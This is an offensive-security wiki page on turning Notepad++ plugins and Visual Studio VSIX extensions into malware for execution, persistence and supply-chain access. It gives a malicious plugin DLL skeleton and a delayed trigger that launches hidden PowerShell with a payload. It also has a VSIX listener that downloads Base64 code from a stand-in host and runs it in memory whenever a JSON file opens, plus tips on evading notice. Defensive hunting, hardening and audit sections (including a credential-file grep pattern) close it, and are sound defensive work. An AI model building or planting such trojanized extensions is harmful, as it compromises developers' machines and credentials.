# Editor Extension and Plugin Abuse for Execution and Supply-Chain Access

{{#include ../../banners/hacktricks-training.md}}

Editor extensions are trusted code, not passive themes. A trojanized package, a lookalike publisher, or a compromised update of an established extension can therefore turn normal editor activity into initial access. The resulting code normally inherits the logged-on user's security context; an installer prompt or an `AllUsers` deployment is not, by itself, a privilege-escalation vulnerability.<sup>[[1]](#references)[[4]](#references)</sup>

Notepad++ will **autoload every plugin DLL found under its `plugins` subfolders** on launch. Dropping a malicious plugin into any **writable Notepad++ installation** gives code execution inside `notepad++.exe` every time the editor starts, which can be abused for **persistence**, stealthy **initial execution**, or as an **in-process loader** if the editor is launched elevated.<sup>[[1]](#references)</sup>

Since **Notepad++ 7.6+** the expected manual-install layout is **one subfolder per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presence of `doLocalConf.xml` next to `notepad++.exe`), the whole application tree stays local to that directory, which often turns copied/admin tool bundles into an easy user-writable execution surface.<sup>[[2]](#references)</sup>

## Writable plugin locations

- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (usually requires admin to write).<sup>[[1]](#references)</sup>
- Writable options for low-privileged operators:<sup>[[1]](#references)</sup>
  - Use the **portable Notepad++ build** in a user-writable folder.
  - Copy `C:\Program Files\Notepad++` to a user-controlled path (e.g. `%LOCALAPPDATA%\npp\`) and run `notepad++.exe` from there.
  - Hunt for **admin tool bundles**, extracted zip copies, or help-desk toolkits that already contain `doLocalConf.xml` and live outside `Program Files`.
- Each plugin gets its own subfolder under `plugins` and is loaded automatically at startup; menu entries appear under **Plugins**.<sup>[[2]](#references)</sup>

Quick triage:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Plugin load points (execution primitives)
Notepad++ expects specific **exported functions**. These are all called during initialization, giving multiple execution surfaces:<sup>[[1]](#references)</sup>
- **`DllMain`** — runs immediately on DLL load (first execution point).
- **`setInfo(NppData)`** — called once on load to provide Notepad++ handles; typical place to register menu items.
- **`getName()`** — returns the plugin name shown in the menu.
- **`getFuncsArray(int *nbF)`** — returns menu commands; even if empty, it is called during startup.
- **`beNotified(SCNotification*)`** — receives Notepad++ / Scintilla events (useful to defer payloads until a user action or editor event).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, useful for larger data exchanges.
- **`isUnicode()`** — compatibility flag checked at load.

Most exports can be implemented as **stubs**; execution can occur from `DllMain` or any callback above during autoload.

## Minimal malicious plugin skeleton
Compile a DLL with the expected exports and place it in `plugins\\MyNewPlugin\\MyNewPlugin.dll` under a writable Notepad++ folder:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## Low-noise trigger pattern via `beNotified`
For OPSEC, many payloads should **not** fire from `DllMain`. A quieter pattern is to let the plugin load cleanly, then execute only after a realistic editor event such as **startup complete**, **buffer activation**, or the **first typed character**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

This matches public offensive research better than a noisy `DllMain` beacon: the DLL is still autoloaded at startup, but the malicious action is delayed until Notepad++ looks genuinely in use.

## Using the plugin config directory as secondary storage
Notepad++ exposes `NPPM_GETPLUGINSCONFIGDIR`, which returns the **current user's plugin configuration directory**.<sup>[[3]](#references)</sup> A malicious plugin can use this to keep the on-disk DLL minimal while storing encrypted config, staged payloads, or tasking files in a path that blends in with normal plugin state.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operationally this is useful when you want:
- a tiny autoloaded bootstrap DLL;
- per-user tasking without touching the main plugin binary again;
- to separate the **autoload trigger** from the heavier second stage.

## Reflective loader plugin pattern
A weaponized plugin can turn Notepad++ into a **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Present a minimal UI/menu entry (e.g., "LoadDLL").
- Accept a **file path** or **URL** to fetch a payload DLL.
- Reflectively map the DLL into the current process and invoke an exported entry point (e.g., a loader function inside the fetched DLL).
- Benefit: reuse a benign-looking GUI process instead of spawning a new loader; payload inherits the integrity of `notepad++.exe` (including elevated contexts).
- Trade-offs: dropping an **unsigned plugin DLL** to disk is noisy; a practical variation is to use the autoloaded plugin only as a stub and keep the real implant encrypted/staged elsewhere.

## Notepad++ detection and hardening notes
- Block or monitor **writes to Notepad++ plugin directories** (including portable copies in user profiles); enable controlled folder access or application allowlisting.
- Alert on **new unsigned DLLs** under `plugins`, changes to portable Notepad++ trees, and unusual **child processes/network activity** from `notepad++.exe`.
- Baseline legitimate plugins and investigate any new DLL that exports the normal Notepad++ plugin interface but also spawns shells, PowerShell, or network beacons.
- Enforce plugin installation via **Plugins Admin** only, and restrict execution of portable copies from untrusted paths.

## Visual Studio VSIX event-triggered execution

Classic VSSDK extensions commonly execute inside `devenv.exe`. The newer `VisualStudio.Extensibility` model primarily runs modern .NET extensions out of process: Visual Studio brokers calls to a dedicated `Microsoft.ServiceHub.Host.Extensibility` process, isolating IDE stability but **not** sandboxing the extension from the user's Windows permissions. The exact executable name can include an architecture suffix, such as `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[4]](#references)[[5]](#references)</sup>

### Trigger on ordinary editor activity

Instead of exposing only a conspicuous menu command, an extension can implement `ITextViewOpenClosedListener`. Its `TextViewOpenedAsync` callback is invoked for matching documents, while `TextViewExtensionConfiguration.AppliesTo` can restrict activation to a common type such as JSON. A real formatter or linter can still perform its advertised work while a second action runs as a side effect of opening a file.<sup>[[4]](#references)[[6]](#references)</sup>

The following reduced pattern shows the important execution points; it omits the legitimate formatter and error handling for clarity.<sup>[[4]](#references)[[6]](#references)</sup>

<details>
<summary>Event-triggered in-memory managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

This chain downloads Base64 text, decodes it to assembly bytes, loads it from a `MemoryStream` through a collectible `AssemblyLoadContext`, invokes the reflected `EntryPoint` with either no parameters or a `string[]`, awaits asynchronous entry points, and unloads the context. The second stage is not written to disk, although the VSIX and primary extension DLL remain disk artefacts. Base64 provides no authenticity or confidentiality; using HTTP also permits response replacement by an on-path attacker.<sup>[[4]](#references)</sup>

Operational variations include suppressing all exceptions so the advertised feature continues when staging fails, using `ITextViewChangedListener` to trigger after edits, or returning tasking such as `cmd|<command>` and launching a hidden `cmd.exe` with redirected streams. Code executes in the extension host and can use managed APIs, P/Invoke, files, credentials, and child processes available to that user.<sup>[[4]](#references)</sup>

### Marketplace and delivery trust abuse

A VSIX can arrive as a directly shared/phished file, from the web Marketplace, or through Visual Studio's embedded Marketplace browser. Publisher registration that mainly enforces uniqueness and a reserved-word list can permit visually suggestive publisher identities; compromising an already trusted publisher or extension is even more effective because it inherits an installed user base. Marketplace installation invokes Visual Studio Installer and temporarily places the downloaded VSIX under `%LOCALAPPDATA%\\Temp`; `payload.vsix` is also used legitimately, so the filename alone is not an indicator.<sup>[[4]](#references)</sup>

MDSec did not identify a Visual Studio URL protocol that directly installed an extension. An operator still needs the user to install/trust the VSIX, or must compromise an existing extension's distribution path. An `AllUsers` package may request elevation and install under `Program Files`, but this is normal consented installer behavior rather than an automatic route to administrator or SYSTEM.<sup>[[4]](#references)</sup>

### Static auditing at scale

VSIX packages are usually ZIP containers, so a safe marketplace-review pipeline can enumerate packages, unpack them **without loading extension code**, parse the manifests, identify executable surfaces, and decompile managed assemblies with `ilspycmd`. Prioritize extension-owned assemblies after excluding common bundled dependencies, then correlate credential-store strings with behavioral clusters such as file-read plus network-send, encode plus send, download plus execution, credential-manager plus network access, or screenshot plus send.<sup>[[4]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Also inventory native DLLs, MSBuild targets, scripts, T4 templates, and installer payloads rather than assuming every execution surface is managed code. Compare suspicious behavior with the manifest's claimed purpose; telemetry and legitimate updaters can resemble exfiltration or staging. Static-only review misses packed, obfuscated, dynamically resolved, and dormant code, and reviewing only the latest version misses malicious historical releases.<sup>[[4]](#references)</sup>

### Visual Studio hunting pivots

High-signal hunting correlates several weak indicators instead of alerting on a VSIX name alone:<sup>[[4]](#references)</sup>

- Visual Studio Installer activity shortly after a new `%LOCALAPPDATA%\\Temp\\*.vsix` file appears.
- New or changed extension DLLs followed by loads into `ServiceHub.Host.Extensibility*.exe` or, for classic extensions, `devenv.exe`.
- Outbound connections, Base64-heavy responses, or unexpected child processes from `ServiceHub.Host.Extensibility*.exe`.
- Static references to `ITextViewOpenClosedListener`/`TextViewOpenedAsync` combined with `HttpClient`, `Convert.FromBase64String`, `AssemblyLoadContext.LoadFromStream`, reflection over `EntryPoint`, or process creation.
- Hidden `cmd.exe` children with redirected standard streams, especially when the parent extension host recently collected hostname, IP, network-interface, or MAC-address data.
- Extension code that accesses browser credential databases, cloud credential files, certificate stores, Windows Credential Manager, wallet files, or developer-token caches without a clear product requirement.

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)
- [4] [MDSec - Visual Studio Extensions Revisited](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [5] [Microsoft Learn - About VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [6] [Microsoft Learn - ITextViewOpenClosedListener](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener?view=vs-extensibility)

{{#include ../../banners/hacktricks-training.md}}
